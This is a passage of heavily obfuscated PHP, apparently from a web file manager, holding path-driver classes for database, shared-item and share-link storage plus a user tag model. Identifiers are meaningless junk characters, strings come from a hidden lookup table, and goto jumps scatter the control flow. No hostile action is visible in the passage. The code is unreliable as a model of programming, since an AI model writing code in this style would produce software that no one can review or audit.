($²›æˆ¬ != !1) { $ÂÔà¬–Û[$›°Ÿà…•[569]] = $²›æˆ¬; $ÂÔà¬–Û[$›°Ÿà…•[190]] = $ëÈŠàË; } $¹¬šÔÜ = array(); $¹¬šÔÜ[$›°Ÿà…•[2275]] = array($›°Ÿà…•[2276] => LNG($›°Ÿà…•[2275]), $›°Ÿà…•[2277] => $this->where($ÂÔà¬–Û)->count(), $›°Ÿà…•[617] => $this->where($ÂÔà¬–Û)->sum($›°Ÿà…•[79])); $÷…¯²” = KodIO::fileTypeList(); foreach ($÷…¯²” as $êßôáÃ¹ => $•Å€»ñ) { $ÂÔà¬–Û[$›°Ÿà…•[486]] = $this->fileTypeWhere($êßôáÃ¹); $¹¬šÔÜ[$êßôáÃ¹] = array($›°Ÿà…•[2276] => $•Å€»ñ[$›°Ÿà…•[32]], $›°Ÿà…•[2277] => $this->where($ÂÔà¬–Û)->count(), $›°Ÿà…•[617] => $this->where($ÂÔà¬–Û)->sum($›°Ÿà…•[79])); } Cache::set($º€Ğ÷ğà, $¹¬šÔÜ, 1200); return $¹¬šÔÜ; } public function fileNameExist($½ò“¬â, $œå‘‰ì) { $ùñÆ•éÔ =& $_SERVER[óÔë„ú]; $Çôğ‹í­ = $this->field($ùñÆ•éÔ[2278])->where(array($ùñÆ•éÔ[192] => $½ò“¬â, $ùñÆ•éÔ[32] => $œå‘‰ì, $ùñÆ•éÔ[505] => 0))->find(); return is_array($Çôğ‹í­) ? $Çôğ‹í­[$ùñÆ•éÔ[193]] : !1; } public function childList($˜µŞüúö) { $Îø±ÃÒ– =& $_SERVER[óÔë„ú]; $³òŠÅ—ˆ = $Îø±ÃÒ–[2251] . $˜µŞüúö; if (isset(self::$cacheChildList[$³òŠÅ—ˆ])) { return self::$cacheChildList[$³òŠÅ—ˆ]; } $Ú¡Éå€ = array($Îø±ÃÒ–[192] => intval($˜µŞüúö), $Îø±ÃÒ–[505] => 0); $Â‘…°ï™ = $this->where($Ú¡Éå€)->select(); $Â‘…°ï™ = $Â‘…°ï™ ? $Â‘…°ï™ : array(); self::$cacheChildList[$³òŠÅ—ˆ] = $Â‘…°ï™; foreach ($Â‘…°ï™ as $şÑó—Ó) { $³òŠÅ—ˆ = $Îø±ÃÒ–[533] . $şÑó—Ó[$Îø±ÃÒ–[193]]; self::$cacheSourceInfo[$³òŠÅ—ˆ] = $şÑó—Ó; } return $Â‘…°ï™; } public function fileNameAuto($Öó†Ì·, $ü—¼ŸªÆ, $Ñî¬® = REPEAT_RENAME, $—÷šëâ = false) { $ìõåÊÈ‡ =& $_SERVER[óÔë„ú]; $şªãÌì = get_path_ext($ü—¼ŸªÆ); $‰´Ò¯œÄ = $şªãÌì ? get_path_ext_name($ü—¼ŸªÆ) . $ìõåÊÈ‡[2279] . $şªãÌì : $ü—¼ŸªÆ . $ìõåÊÈ‡[460]; $ÉÜĞßó = array($ìõåÊÈ‡[192] => $Öó†Ì·, $ìõåÊÈ‡[505] => 0, $ìõåÊÈ‡[32] => array($ìõåÊÈ‡[459], $‰´Ò¯œÄ)); $¤Ì±©°ï = $this->field($ìõåÊÈ‡[32])->where($ÉÜĞßó)->select(); $ÄÂ¦¹ = array_to_keyvalue($¤Ì±©°ï, $ìõåÊÈ‡[12], $ìõåÊÈ‡[32]); return $this->fileNameAutoGet($ÄÂ¦¹, $ü—¼ŸªÆ, $Ñî¬®, $—÷šëâ); } public function fileNameAutoGet($òìúŸò¡, $µ†àıæ—, $âÕ¨» É, $–êæ—ï) { $ŠĞÁÔ¨½ =& $_SERVER[óÔë„ú]; if ($âÕ¨» É == REPEAT_REPLACE || !$òìúŸò¡ || !in_array_not_case($µ†àıæ—, $òìúŸò¡) || $–êæ—ï && $âÕ¨» É != REPEAT_RENAME_FOLDER) { return $µ†àıæ—; } if ($âÕ¨» É == REPEAT_SKIP) { return !1; } $Ğ¦¦»É¾ = $ŠĞÁÔ¨½[10] . get_path_ext($µ†àıæ—); $Ğ¦¦»É¾ = $Ğ¦¦»É¾ == $ŠĞÁÔ¨½[10] || $–êæ—ï ? $ŠĞÁÔ¨½[12] : $Ğ¦¦»É¾; for ($æéô®Òç = 1; $æéô®Òç <= count($òìúŸò¡) + 1; $æéô®Òç++) { $´…äˆÛ’ = substr($µ†àıæ—, 0, strlen($µ†àıæ—) - strlen($Ğ¦¦»É¾)); $©™ì¡‘Ÿ = $´…äˆÛ’ . "\50{$æéô®Òç}\x29{$Ğ¦¦»É¾}"; if (!in_array_not_case($©™ì¡‘Ÿ, $òìúŸò¡)) { return $©™ì¡‘Ÿ; } } } } goto bÚ‰æØí…ö; EåÅÊ¨ÊŠÇ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($í¾ß’ìµ) { $this->pathParse = $í¾ß’ìµ; $this->model = Model($_SERVER[óÔë„ú][1405]); } public function getPath($È’“ŞÃ†) { return trim($È’“ŞÃ†, $_SERVER[óÔë„ú][8]); } public function pathFather($˜Íşúö­) { $ÏµŞÈÌ¥ = $this->parse($˜Íşúö­); $ÏµŞÈÌ¥ = $this->infoSimple($˜Íşúö­); return $ÏµŞÈÌ¥ ? $ÏµŞÈÌ¥[$_SERVER[óÔë„ú][192]] : !1; } public function pathThis($éŒï»¬) { $’âÛşƒŠ = $this->infoSimple($éŒï»¬); return $’âÛşƒŠ ? $’âÛşƒŠ[$_SERVER[óÔë„ú][32]] : !1; } public function getPathOuter($ÊçÂÀÖ”) { if (!$ÊçÂÀÖ”) { return $ÊçÂÀÖ”; } $ƒš…âæÃ = $this->parse($ÊçÂÀÖ”); return KodIO::make($ƒš…âæÃ[$_SERVER[óÔë„ú][475]]); } public function copyFolderFromIO($™Éè±Ê , $Ï»ŸúŸ÷, $¸¿ùşˆ™, $ÎôÍùğ, $ì›‡»¾) { $ù¸¼ü¹ï = $this->model->copyFolderFromIO($™Éè±Ê , $Ï»ŸúŸ÷, $¸¿ùşˆ™, $ÎôÍùğ, $ì›‡»¾); return KodIO::make($ù¸¼ü¹ï); } public function isParentOf($À½·ÓïÑ, $“×­¥¡Ğ) { return $this->model->isParentOf($À½·ÓïÑ, $“×­¥¡Ğ); } public function mkfile($ì¥í½Ä, $úƒªúœ× = '', $ÍúêŞàÎ = REPEAT_RENAME) { $òúıïŠ‚ =& $_SERVER[óÔë„ú]; $É³€àŒô = $this->parse($ì¥í½Ä); $ì¥í½Ä = $É³€àŒô[$òúıïŠ‚[475]]; for ($Òƒ²Æ‚’ = 0; $Òƒ²Æ‚’ < count($É³€àŒô[$òúıïŠ‚[1406]]); $Òƒ²Æ‚’++) { $ø¥§Üî = $É³€àŒô[$òúıïŠ‚[1406]][$Òƒ²Æ‚’]; if ($Òƒ²Æ‚’ == count($É³€àŒô[$òúıïŠ‚[1406]]) - 1) { $ì¥í½Ä = $this->model->mkfile($ì¥í½Ä, $ø¥§Üî, $úƒªúœ×, $ÍúêŞàÎ); break; } $ì¥í½Ä = $this->model->mkdir($ì¥í½Ä, $ø¥§Üî, REPEAT_SKIP); } return $this->getPathOuter($ì¥í½Ä); } public function mkdir($ú‚Ÿ½­ä, $“º–Úª = REPEAT_SKIP) { $éÜÚ‚ìğ =& $_SERVER[óÔë„ú]; $¦£İ“î = $this->parse($ú‚Ÿ½­ä); $ú‚Ÿ½­ä = $¦£İ“î[$éÜÚ‚ìğ[475]]; for ($¬Ú¶µ®¸ = 0; $¬Ú¶µ®¸ < count($¦£İ“î[$éÜÚ‚ìğ[1406]]); $¬Ú¶µ®¸++) { $âÛ‰„ò = $¦£İ“î[$éÜÚ‚ìğ[1406]][$¬Ú¶µ®¸]; $ú‚Ÿ½­ä = $this->model->mkdir($ú‚Ÿ½­ä, $âÛ‰„ò, $“º–Úª); } return $this->getPathOuter($ú‚Ÿ½­ä); } public function copyFile($ù¡¥å¸â, $ƒã ¨¾À, $ÛãÍøº = REPEAT_REPLACE) { $‹™ˆˆÊ =& $_SERVER[óÔë„ú]; $û–Äé›§ = $this->parse($ƒã ¨¾À); $ŞµäÜ‹È = $this->model->copy($ù¡¥å¸â, $û–Äé›§[$‹™ˆˆÊ[475]], $ÛãÍøº, $û–Äé›§[$‹™ˆˆÊ[87]]); return $ŞµäÜ‹È ? $this->getPathOuter($ŞµäÜ‹È) : !1; } public function moveFile($æ·•ŸØ, $’‡Ê½„, $Î³ûˆ·‰ = REPEAT_REPLACE) { $Á°µ°òß =& $_SERVER[óÔë„ú]; $ÊÈ€úğ´ = $this->parse($’‡Ê½„); $ÆØ¹¨–Á = $this->model->move($æ·•ŸØ, $ÊÈ€úğ´[$Á°µ°òß[475]], $Î³ûˆ·‰, $ÊÈ€úğ´[$Á°µ°òß[87]]); return $ÆØ¹¨–Á ? $this->getPathOuter($ÆØ¹¨–Á) : !1; } public function copy($ıÁÇ°¤ô, $·ë“á¦, $éá´¢Æê = REPEAT_REPLACE, $ŸÒ  = false) { $µìŞŞ”º = $this->parse($·ë“á¦); $€õèÁæÜ = $this->model->copy($ıÁÇ°¤ô, $µìŞŞ”º[$_SERVER[óÔë„ú][475]], $éá´¢Æê, $ŸÒ ); return $€õèÁæÜ ? $this->getPathOuter($€õèÁæÜ) : !1; } public function moveSameAllow() { } public function move($Ö¯Çè×¸, $ø˜Ì×, $‹¾‰«¸ø = REPEAT_REPLACE, $‘‘ãŞ¥ù = false) { $ìœÜİË = $this->parse($ø˜Ì×); $Óê«åÖ = $this->model->move($Ö¯Çè×¸, $ìœÜİË[$_SERVER[óÔë„ú][475]], $‹¾‰«¸ø, $‘‘ãŞ¥ù); return $Óê«åÖ ? $this->getPathOuter($Óê«åÖ) : !1; } public function remove($üœãß˜, $îœé´Åå = true) { return $this->model->remove($üœãß˜, $îœé´Åå); } public function rename($šÙ¡ø¢ı, $Ú¥‘Ç•¼) { $‰¤ê†¡İ = $this->model->rename($šÙ¡ø¢ı, $Ú¥‘Ç•¼); return $‰¤ê†¡İ ? $this->getPathOuter($šÙ¡ø¢ı) : $‰¤ê†¡İ; } public function size($œÉâ¿àÜ) { $¯ò×çøİ = $this->infoSimple($œÉâ¿àÜ); return $¯ò×çøİ ? $¯ò×çøİ[$_SERVER[óÔë„ú][79]] : 0; } public function infoSimple($â‡ùëÊé) { return $this->model->sourceInfo($â‡ùëÊé); } public function info($ªĞİ²•¾) { return $this->infoParse($ªĞİ²•¾); } public function infoAuth($İÚÈ§±) { return $this->infoParse($İÚÈ§±, !1, !0); } public function infoWithChildren($„ŠÄ²‚É) { return $this->infoParse($„ŠÄ²‚É, !0); } protected function infoParse($Š¾ŠÃªÓ, $â¹÷„“ = false, $è×ˆ½© = false) { if (!$â¹÷„“) { return $this->model->pathInfo($Š¾ŠÃªÓ, $è×ˆ½©); } return $this->model->pathInfoMore($Š¾ŠÃªÓ); } public function infoFullSimple($î†©ùá) { $ÍªõğÌƒ =& $_SERVER[óÔë„ú]; $ÜÛá‹´â = explode($ÍªõğÌƒ[8], $î†©ùá); $ËãïÚ®Œ = implode($ÍªõğÌƒ[8], array_splice($ÜÛá‹´â, 1)); return $this->model->pathInfoByPath($ÜÛá‹´â[0], $ËãïÚ®Œ); } public function infoFull($ó¤ÁÙ²) { $ƒŠ¬”Ğ = $this->infoFullSimple($ó¤ÁÙ²); return is_array($ƒŠ¬”Ğ) ? $this->model->pathInfo($ƒŠ¬”Ğ[$_SERVER[óÔë„ú][193]]) : !1; } public function hashSimple($«‘µÃÆ‚) { $ƒœşõ’ =& $_SERVER[óÔë„ú]; $Çúüƒò = $this->infoWithChildren($«‘µÃÆ‚); return $Çúüƒò[$ƒœşõ’[170]][$ƒœşõ’[672]]; } public function hashMd5($¬³Öè¿ ) { $Ò¯¦ßáŸ =& $_SERVER[óÔë„ú]; $¥õ¤‰–® = $this->infoWithChildren($¬³Öè¿ ); return $¥õ¤‰–®[$Ò¯¦ßáŸ[170]][$Ò¯¦ßáŸ[547]]; } public function exist($òşÖËğ») { $ïÂÎü€è =& $_SERVER[óÔë„ú]; $¬‘ŸÌê® = $this->parse($òşÖËğ»); if (!$¬‘ŸÌê®[$ïÂÎü€è[87]]) { return $this->isFile($òşÖËğ») || $this->isFolder($òşÖËğ»); } $’¡ ú§¦ = array($ïÂÎü€è[477] => $¬‘ŸÌê®[$ïÂÎü€è[475]], $ïÂÎü€è[32] => $¬‘ŸÌê®[$ïÂÎü€è[87]]); $È°½şœÊ = $this->model->where($’¡ ú§¦)->find(); return $È°½şœÊ ? !0 : !1; } public function isFile($Û›Æ¶ˆÊ) { $©Ç÷°ß¬ =& $_SERVER[óÔë„ú]; $æŸ¦ñ = $this->infoSimple($Û›Æ¶ˆÊ); return $æŸ¦ñ && $æŸ¦ñ[$©Ç÷°ß¬[485]] == $©Ç÷°ß¬[228] ? !0 : !1; } public function isFolder($©î±¯) { $…ÈòÅˆá =& $_SERVER[óÔë„ú]; $ïïÅ¹¡ú = $this->infoSimple($©î±¯); return $ïïÅ¹¡ú && $ïïÅ¹¡ú[$…ÈòÅˆá[485]] == $…ÈòÅˆá[91] ? !0 : !1; } public function listPath($Ÿµ†¶ê¸, $‘Ğ¢”¿¾ = false) { $õâ­—ÁÑ =& $_SERVER[óÔë„ú]; if ($Ÿµ†¶ê¸ == $õâ­—ÁÑ[12]) { return !1; } $·Ğã‘äÄ = array($õâ­—ÁÑ[477] => $Ÿµ†¶ê¸); if ($‘Ğ¢”¿¾) { return $this->model->listSource($·Ğã‘äÄ, -1); } return $this->model->listSource($·Ğã‘äÄ); } public function has($åÃ²àØ°, $‘®–ÛªŸ = false, $…«Ë•Š = null) { $‚ëŒ–Â… =& $_SERVER[óÔë„ú]; $¹š—¾Ç = $this->infoWithChildren($åÃ²àØ°); if ($‘®–ÛªŸ) { return array($‚ëŒ–Â…[240] => $¹š—¾Ç[$‚ëŒ–Â…[240]], $‚ëŒ–Â…[239] => $¹š—¾Ç[$‚ëŒ–Â…[239]]); } return $…«Ë•Š ? $¹š—¾Ç[$‚ëŒ–Â…[240]] : $¹š—¾Ç[$‚ëŒ–Â…[239]]; } public function listAll($Ñïé¹º„) { $‘ßŞœ©¶ = IO::info($this->pathParse[$_SERVER[óÔë„ú][87]]); if (!$‘ßŞœ©¶) { return array(); } return $this->model->listAll($Ñïé¹º„); } public function getContent($ò¤·¡Õ€) { return $this->model->getContent($ò¤·¡Õ€); } public function setContent($¶Â¸ø‰´, $êÀˆ‰Å¦ = '') { return $this->model->setContent($¶Â¸ø‰´, $êÀˆ‰Å¦); } public function fileSubstr($‘Ú½¹˜ü, $öó¬ºã, $åØÀøòÒ) { return $this->model->fileSubstr($‘Ú½¹˜ü, $öó¬ºã, $åØÀøòÒ); } public function download($á”Ø¤Ú, $¾Óá­« = '') { $¬¿«ïñ = get_path_father($¾Óá­«); $­óÉÇ€¶ = get_path_this($¾Óá­«); $Õš¼ˆµª = $this->model->fileInfoGet($á”Ø¤Ú); $Ê‡¯¢ÒÎ = IO::copy($Õš¼ˆµª[$_SERVER[óÔë„ú][87]], $¬¿«ïñ, !1, $­óÉÇ€¶); return $Ê‡¯¢ÒÎ; } public function setModifyTime($î ÏØ›î, $ùö·èùŞ = '') { $ÏöÄÖú =& $_SERVER[óÔë„ú]; if (!$î ÏØ›î) { return; } $this->model->where(array($ÏöÄÖú[491] => $î ÏØ›î))->save(array($ÏöÄÖú[88] => $ùö·èùŞ)); } public function upload($ùò¢´¿, $§ï à¢Î, $ú‰âÎ½À = false, $Çõë•É¢ = REPEAT_REPLACE) { $¸àæ¨ =& $_SERVER[óÔë„ú]; $¤à£”ù¦ = $this->parse($ùò¢´¿); $°¥éº‡¯ = $this->model->addFile($¤à£”ù¦[$¸àæ¨[475]], $§ï à¢Î, $¤à£”ù¦[$¸àæ¨[87]], $ú‰âÎ½À, $Çõë•É¢); return $this->getPathOuter($°¥éº‡¯); } public function uploadFileByID($×½ÑÚòü, $Äì¤Î, $ªÃÅñôÊ) { $¢îŒ‚ˆº =& $_SERVER[óÔë„ú]; $óæ‰²º¸ = $this->parse($×½ÑÚòü); $Ãà‘©ëï = $this->model->addFileByFileID($óæ‰²º¸[$¢îŒ‚ˆº[475]], $Äì¤Î, $óæ‰²º¸[$¢îŒ‚ˆº[87]], $ªÃÅñôÊ); return $this->getPathOuter($Ãà‘©ëï); } public function addFileByRemote($üÔá™±à, $áóùï½ı, $œşß„½» = array(), $Ğ¼ Æ€ù = '', $°¥ƒò) { $ñ¸õÑì™ =& $_SERVER[óÔë„ú]; $ıŸ¦´î° = $this->parse($üÔá™±à); $Ğ¼ Æ€ù = empty($Ğ¼ Æ€ù) ? $ıŸ¦´î°[$ñ¸õÑì™[87]] : $Ğ¼ Æ€ù; $éÌğÑéµ = $this->model->addFileByRemote($ıŸ¦´î°[$ñ¸õÑì™[475]], $áóùï½ı, $Ğ¼ Æ€ù, $œşß„½», $°¥ƒò); return $this->getPathOuter($éÌğÑéµ); } public function uploadLink($íç‰ï­™, $š‚»æ‘Ù = 0) { $ŒÜ¬–‚¯ =& $_SERVER[óÔë„ú]; $¢ËÜÃ¬Å = $this->parse($íç‰ï­™); $Ñóš®Â = _get($GLOBALS[$ŒÜ¬–‚¯[7]], $ŒÜ¬–‚¯[1407]); $Ë¬¢ô é = _get($GLOBALS[$ŒÜ¬–‚¯[7]], $ŒÜ¬–‚¯[1408]); $íç‰ï­™ = Model($ŒÜ¬–‚¯[674])->createFileName($¢ËÜÃ¬Å[$ŒÜ¬–‚¯[87]], $Ñóš®Â, $Ë¬¢ô é); return IO::uploadLink($íç‰ï­™, $š‚»æ‘Ù); } public function fileNameAuto($€é£®ë”, $‰¢» Â³, $íÛü‹¸ = REPEAT_REPLACE, $’¨‚şÄÅ = false) { return $this->model->fileNameAuto($€é£®ë”, $‰¢» Â³, $íÛü‹¸, $’¨‚şÄÅ); } public function fileNameExist($ËÒ·¦Å³, $µÍäğ§) { return $this->model->fileNameExist($ËÒ·¦Å³, $µÍäğ§); } protected function _fileOut($œ¿ÃƒÛ, $ÖËäãŞ = false, $çêî÷¦É = false, $×Ê‚’´¦ = '', $ô¨ÈŞè© = false) { $ÈÊÅ¬ÅŸ =& $_SERVER[óÔë„ú]; $¸€ş˜Æ = $this->model->sourceInfo($œ¿ÃƒÛ); if ($¸€ş˜Æ[$ÈÊÅ¬ÅŸ[485]] == $ÈÊÅ¬ÅŸ[91]) { header($ÈÊÅ¬ÅŸ[1409]); die; } $ÚÂÜã = $this->model->fileInfoGet($œ¿ÃƒÛ); $×Ê‚’´¦ = $ÚÂÜã[$ÈÊÅ¬ÅŸ[547]] ? $ÚÂÜã[$ÈÊÅ¬ÅŸ[547]] : $×Ê‚’´¦; $±ôØøÜ = isset($GLOBALS[$ÈÊÅ¬ÅŸ[182]]) && is_array($GLOBALS[$ÈÊÅ¬ÅŸ[182]]) ? $GLOBALS[$ÈÊÅ¬ÅŸ[182]][$ÈÊÅ¬ÅŸ[32]] : $¸€ş˜Æ[$ÈÊÅ¬ÅŸ[32]]; if ($ô¨ÈŞè©) { return IO::fileOutServer($ÚÂÜã[$ÈÊÅ¬ÅŸ[87]], $ÖËäãŞ, $±ôØøÜ, $×Ê‚’´¦); } IO::fileOut($ÚÂÜã[$ÈÊÅ¬ÅŸ[87]], $ÖËäãŞ, $±ôØøÜ, $×Ê‚’´¦); } public function fileOut($‘™¥Ş¼, $ÙÈ„»ØŠ = false, $ƒÑÔ±»Ô = false, $ĞÇÖÏºõ = '') { $this->_fileOut($‘™¥Ş¼, $ÙÈ„»ØŠ, $ƒÑÔ±»Ô, $ĞÇÖÏºõ); } public function fileOutServer($Ï›¾Ñ€‚, $”³áÏ­á = false, $Èµ´Ø—ö = false, $™²Â¨ş— = '') { $this->_fileOut($Ï›¾Ñ€‚, $”³áÏ­á, $Èµ´Ø—ö, $™²Â¨ş—, !0); } protected function _fileOutImage($°ô°¬ÍÎ, $—©‰÷’ü = 250) { $ù£³»Ôœ =& $_SERVER[óÔë„ú]; $ÇüòÒ€ = $this->model->pathInfo($°ô°¬ÍÎ); if ($ÇüòÒ€[$ù£³»Ôœ[485]] == $ù£³»Ôœ[91]) { show_json($ù£³»Ôœ[1410] . $°ô°¬ÍÎ, !1); } $”¬¡‹Ú = $this->model->fileInfoGet($°ô°¬ÍÎ); $ÇüòÒ€[$ù£³»Ôœ[183]] = $”¬¡‹Ú[$ù£³»Ôœ[87]]; $GLOBALS[$ù£³»Ôœ[182]] = $ÇüòÒ€; IO::fileOutImage($”¬¡‹Ú[$ù£³»Ôœ[87]], $—©‰÷’ü); } public function fileOutImage($Õœµ³ˆ¨, $Ñ“Ëº®® = 250) { $this->_fileOutImage($Õœµ³ˆ¨, $Ñ“Ëº®®); } public function fileOutImageServer($•åİ‰, $õ‘ûŸò = 250) { $this->_fileOutImage($•åİ‰, $õ‘ûŸò); } public function link($¡š¹û÷ä, $µ‚š¢ï£ = '') { $‰¤Ó‚°õ = $this->model->fileInfoGet($¡š¹û÷ä); return IO::link($‰¤Ó‚°õ[$_SERVER[óÔë„ú][87]], $µ‚š¢ï£); } protected function parse($³êÜ£Áâ) { $é‘äÕ„ï =& $_SERVER[óÔë„ú]; if (strstr($³êÜ£Áâ, $é‘äÕ„ï[8]) === !1) { return array($é‘äÕ„ï[493] => intval($³êÜ£Áâ), $é‘äÕ„ï[87] => $é‘äÕ„ï[12], $é‘äÕ„ï[1406] => array()); } $ñ’ÂşÆ÷ = explode($é‘äÕ„ï[8], trim($³êÜ£Áâ, $é‘äÕ„ï[8])); if (count($ñ’ÂşÆ÷) < 2) { show_tips(clear_html($³êÜ£Áâ) . $é‘äÕ„ï[1411]); } return array($é‘äÕ„ï[493] => intval($ñ’ÂşÆ÷[0]), $é‘äÕ„ï[87] => $ñ’ÂşÆ÷[1], $é‘äÕ„ï[1406] => array_slice($ñ’ÂşÆ÷, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($é»™úÛÖ) { $this->pathParse = $é»™úÛÖ; $this->model = Model($_SERVER[óÔë„ú][1405]); } public function getPathOuter($ØÚ”İŠ) { $¾œ‹Í• =& $_SERVER[óÔë„ú]; if (!$ØÚ”İŠ) { return $ØÚ”İŠ; } $ÜÑş¦ƒ™ = $this->parse($ØÚ”İŠ); return trim(KodIO::makeShare($this->pathParse[$¾œ‹Í•[475]], $ÜÑş¦ƒ™[$¾œ‹Í•[475]]), $¾œ‹Í•[8]); } protected function infoParse($£Ìö—¼, $éøĞ§€í = false, $À´¡òÂé = false) { $åÙĞƒçİ =& $_SERVER[óÔë„ú]; $óÊƒ–ÕÜ = $this->pathParse[$åÙĞƒçİ[475]]; $Ú³´ÑÌ = trim($this->pathParse[$åÙĞƒçİ[1235]], $åÙĞƒçİ[8]); return Action($åÙĞƒçİ[1412])->sharePathInfo($óÊƒ–ÕÜ, $Ú³´ÑÌ, $éøĞ§€í); } public function infoFull($Ô£ë¢Ò‰) { $±¨¢İ¤ß =& $_SERVER[óÔë„ú]; $Ş¨†ƒÎ• = explode($±¨¢İ¤ß[8], trim($Ô£ë¢Ò‰, $±¨¢İ¤ß[8])); if (count($Ş¨†ƒÎ•) > 1) { $”•ÊÓœº = implode($±¨¢İ¤ß[8], array_splice($Ş¨†ƒÎ•, 1)); $˜•Øƒ‡· = $this->model->pathInfoByPath($Ş¨†ƒÎ•[0], $”•ÊÓœº); if (!$˜•Øƒ‡·) { return !1; } $this->pathParse[$±¨¢İ¤ß[1235]] = $˜•Øƒ‡·[$±¨¢İ¤ß[193]]; } return $this->infoParse($Ô£ë¢Ò‰); } public function listAll($Õïõ’Î‚) { $üˆÙ¶š¹ =& $_SERVER[óÔë„ú]; $Ô£Æş·³ = IO::info($this->pathParse[$üˆÙ¶š¹[87]]); if (!$Ô£Æş·³) { return array(); } $‚ÇÏÚ»— = $this->model->listAll($Õïõ’Î‚); $ËÑäŞ›¶ = Model($üˆÙ¶š¹[664])->getInfo($Ô£Æş·³[$üˆÙ¶š¹[665]]); foreach ($‚ÇÏÚ»— as &$Ï„®ø¥) { check_abort(); $Ï„®ø¥[$üˆÙ¶š¹[90]] = Action($üˆÙ¶š¹[1412])->_shareItemeParse($Ï„®ø¥[$üˆÙ¶š¹[90]], $ËÑäŞ›¶); } unset($Ï„®ø¥); return $‚ÇÏÚ»—; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÛÜÁ½¸í) { $this->pathParse = $ÛÜÁ½¸í; $this->model = Model($_SERVER[óÔë„ú][1405]); } protected function infoParse($ÛÅŒÅøÛ, $Ñ”À£™è = false, $¬çıé­² = false) { $Ö“àç»³ =& $_SERVER[óÔë„ú]; return Action($Ö“àç»³[1241])->sharePathInfo($this->pathParse[$Ö“àç»³[87]], !0, $Ñ”À£™è); } public function listPath($«ö£Œ¸, $Ì§åèˆë = false) { $àú¥í… =& $_SERVER[óÔë„ú]; $ïˆİöŸ = parent::listPath($«ö£Œ¸, $Ì§åèˆë); if (!$ïˆİöŸ) { return $ïˆİöŸ; } if (is_array($ïˆİöŸ[$àú¥í…[1413]])) { $ïˆİöŸ[$àú¥í…[1413]] = Action($àú¥í…[1241])->shareItemInfo($ïˆİöŸ[$àú¥í…[1413]]); } foreach ($ïˆİöŸ as $§üÚ‰–Æ => $´‚á×¬¥) { if (!in_array($§üÚ‰–Æ, array($àú¥í…[86], $àú¥í…[85]))) { continue; } foreach ($´‚á×¬¥ as $¡¦ÈªšŞ => $ı¤Ğİ³•) { $ïˆİöŸ[$§üÚ‰–Æ][$¡¦ÈªšŞ] = Action($àú¥í…[1241])->shareItemInfo($ı¤Ğİ³•); } } return $ïˆİöŸ; } public function listAll($ÉÅÀ÷¦ş) { $Àª´ò· =& $_SERVER[óÔë„ú]; $µòæÏÛÂ = IO::info($this->pathParse[$Àª´ò·[87]]); if (!$µòæÏÛÂ) { return array(); } $ç°‰Š¢® = $this->model->listAll($ÉÅÀ÷¦ş); foreach ($ç°‰Š¢® as &$¥îùÚ®°) { $¥îùÚ®°[$Àª´ò·[90]] = Action($Àª´ò·[1241])->shareItemInfo($¥îùÚ®°[$Àª´ò·[90]]); } unset($¥îùÚ®°); return $ç°‰Š¢®; } } goto cùİ–¹¸Ü¾; AÛ’ÖÈ¬Ê: define($_SERVER[óÔë„ú][317], 3); define($_SERVER[óÔë„ú][318], 1); define($_SERVER[óÔë„ú][319], 0); goto D’Ë™šÑ³; Bâƒ¨’Š: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\x61\166"; protected function cacheFunctionAlias($ÀèÅ•òÊ) { $¡‰ß”Ò =& $_SERVER[óÔë„ú]; return array($¡‰ß”Ò[2072] => array($¡‰ß”Ò[2487] . USER_ID, $¡‰ß”Ò[2073])); } protected function listData() { $ñ¬ÓçÕì =& $_SERVER[óÔë„ú]; $™ó´Ìğ = array($ñ¬ÓçÕì[1749] => USER_ID, $ñ¬ÓçÕì[557] => array($ñ¬ÓçÕì[2076], 0)); $×º«×ü = $ñ¬ÓçÕì[2488]; $˜°ùâ‚® = $this->field($×º«×ü)->where($™ó´Ìğ)->order($ñ¬ÓçÕì[2079])->select(); return $˜°ùâ‚® ? $˜°ùâ‚® : array(); } protected function addToTag($˜Ì¹üş£, $é÷÷àÌû) { $Ñè¶ÀÒé =& $_SERVER[óÔë„ú]; if (!Model($Ñè¶ÀÒé[2223])->listData($é÷÷àÌû)) { return !1; } if (is_numeric($˜Ì¹üş£)) { $°Â¾ÁŸ = Model($Ñè¶ÀÒé[884])->pathInfo($˜Ì¹üş£); if (!$°Â¾ÁŸ) { return !1; } } else { $°Â¾ÁŸ = IO::infoSimple($˜Ì¹üş£); if (!$°Â¾ÁŸ) { return !1; } $”ùéÇ¸ = $°Â¾ÁŸ[$Ñè¶ÀÒé[32]]; $‰šß˜ˆ˜ = $°Â¾ÁŸ[$Ñè¶ÀÒé[33]]; if (isset($°Â¾ÁŸ[$Ñè¶ÀÒé[485]])) { $‰šß˜ˆ˜ = $°Â¾ÁŸ[$Ñè¶ÀÒé[485]] == $Ñè¶ÀÒé[91] ? $Ñè¶ÀÒé[78] : $Ñè¶ÀÒé[230]; } } $íóüÓÛÙ = array($Ñè¶ÀÒé[1749] => USER_ID, $Ñè¶ÀÒé[557] => $é÷÷àÌû, $Ñè¶ÀÒé[495] => $˜Ì¹üş£, $Ñè¶ÀÒé[496] => $‰šß˜ˆ˜ ? $‰šß˜ˆ˜ : $Ñè¶ÀÒé[490], $Ñè¶ÀÒé[494] => $”ùéÇ¸ ? $”ùéÇ¸ : $Ñè¶ÀÒé[12], $Ñè¶ÀÒé[1961] => 0); if ($this->where($íóüÓÛÙ)->find()) { return !1; } return $this->add($íóüÓÛÙ); } protected function removeFromTag($Ş¾¤ıä, $§İÏÄ«û) { $éã°“È» =& $_SERVER[óÔë„ú]; if (!Model($éã°“È»[2223])->listData($§İÏÄ«û)) { return !1; } if (is_array($Ş¾¤ıä)) { $Ş¾¤ıä = array($éã°“È»[7], $Ş¾¤ıä); } $îØƒ‰Á = array($éã°“È»[1749] => USER_ID, $éã°“È»[557] => $§İÏÄ«û, $éã°“È»[495] => $Ş¾¤ıä); return $this->where($îØƒ‰Á)->delete(); } protected function removeByTag($È·“£ïü) { $ü–…ÖÔ =& $_SERVER[óÔë„ú]; if (!$È·“£ïü) { return !1; } $‚·î™ÚÑ = array($ü–…ÖÔ[1749] => USER_ID, $ü–…ÖÔ[557] => $È·“£ïü); return $this->where($‚·î™ÚÑ)->delete(); } protected function removeBySource($§€‚¢ö) { $Ä½ê§ºÚ =& $_SERVER[óÔë„ú]; if (is_array($§€‚¢ö)) { $§€‚¢ö = array($Ä½ê§ºÚ[7], $§€‚¢ö); } $”‰ø¦äğ = array($Ä½ê§ºÚ[1749] => USER_ID, $Ä½ê§ºÚ[557] => 